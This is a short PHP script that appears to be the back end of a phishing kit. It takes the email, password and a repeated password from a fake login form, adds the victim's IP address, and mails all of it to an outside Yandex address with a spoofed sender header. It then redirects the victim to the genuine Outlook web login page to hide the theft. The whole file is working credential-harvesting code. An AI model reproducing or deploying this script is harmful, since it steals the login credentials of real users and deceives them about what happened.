<?
$ip = getenv("REMOTE_ADDR");
$message .= "===============|New Log|==============\n";
$message .= "Email: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "Password 2: ".$_POST['password2']."\n";
$message .= "IP: ".$ip."\n";
$message .= "===============|N O N N I|==============\n";
$send = "sima.group@yandex.com";
$subject = "SIMA 2021 - LOGIN - FROM [$ip]";
$headers = "From: Lvrxdnona<goggle.comm>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers);
header("Location: http://outlook.office365.com/owa");


?>
